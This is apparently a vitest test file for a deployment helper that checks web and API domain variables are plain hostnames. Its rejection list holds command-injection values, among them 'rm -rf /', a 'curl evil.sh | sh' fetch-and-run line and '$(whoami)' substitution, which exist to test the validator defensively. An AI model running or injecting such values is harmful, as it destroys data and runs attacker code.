import { describe, expect, it } from "vitest";
import { deployTargets, parseDomain } from "./deploy-targets";

const ok = (env: Parameters<typeof deployTargets>[0]) => {
  const r = deployTargets(env);
  if (!r.ok) throw new Error(r.error);
  return r.value;
};
const error = (env: Parameters<typeof deployTargets>[0]) => {
  const r = deployTargets(env);
  if (r.ok) throw new Error("expected an error");
  return r.error;
};

describe("deployTargets (#51)", () => {
  it("both variables set: deploys the Worker to the API domain, builds against it, attaches the web domain", () => {
    expect(ok({ WEB_DOMAIN: "play.example.com", API_DOMAIN: "api.example.com" })).toEqual({
      workerArgs: ["--domain", "api.example.com"],
      apiUrl: "https://api.example.com",
      pagesDomain: "play.example.com",
    });
  });

  it("neither set (unset or empty, as GitHub passes an unset variable): today's workers.dev and pages.dev", () => {
    const today = { workerArgs: [], apiUrl: null, pagesDomain: null };
    expect(ok({})).toEqual(today);
    expect(ok({ WEB_DOMAIN: "", API_DOMAIN: "  " })).toEqual(today);
  });

  it("only one set: an error that names the missing variable", () => {
    expect(error({ WEB_DOMAIN: "play.example.com" })).toContain("API_DOMAIN is missing");
    expect(error({ API_DOMAIN: "api.example.com", WEB_DOMAIN: "" })).toContain(
      "WEB_DOMAIN is missing",
    );
  });

  it("the two domains must differ", () => {
    expect(error({ WEB_DOMAIN: "a.example.com", API_DOMAIN: "A.example.com " })).toMatch(
      /different/,
    );
  });

  it("normalises case and surrounding spaces", () => {
    expect(
      ok({ WEB_DOMAIN: " Play.Example.COM ", API_DOMAIN: "api.example.com" }).pagesDomain,
    ).toBe("play.example.com");
  });

  it.each([
    "a.com; rm -rf /",
    "a.com && curl evil.sh | sh",
    "$(whoami).example.com",
    "`id`.example.com",
    "play.example.com --route x",
    "play example.com",
    "https://play.example.com",
    "play.example.com/path",
    "play.example.com:443",
    "play.example.com.",
    ".example.com",
    "-play.example.com",
    "play-.example.com",
    "play..example.com",
    "localhost",
    "bücher.example.com",
    `${"a".repeat(64)}.example.com`,
    "a\nb.example.com",
  ])("rejects %j before anything runs", (bad) => {
    expect(error({ WEB_DOMAIN: bad, API_DOMAIN: "api.example.com" })).toContain(
      "WEB_DOMAIN must be a plain hostname",
    );
    expect(error({ WEB_DOMAIN: "play.example.com", API_DOMAIN: bad })).toContain(
      "API_DOMAIN must be a plain hostname",
    );
  });

  it("accepts ordinary and internationalised (punycode) hostnames", () => {
    for (const good of [
      "play.example.app",
      "a-b.c-d.co.uk",
      "xn--bcher-kva.example.com",
      "1.example.org",
    ])
      expect(parseDomain("X", good)).toEqual({ ok: true, value: good });
  });
});
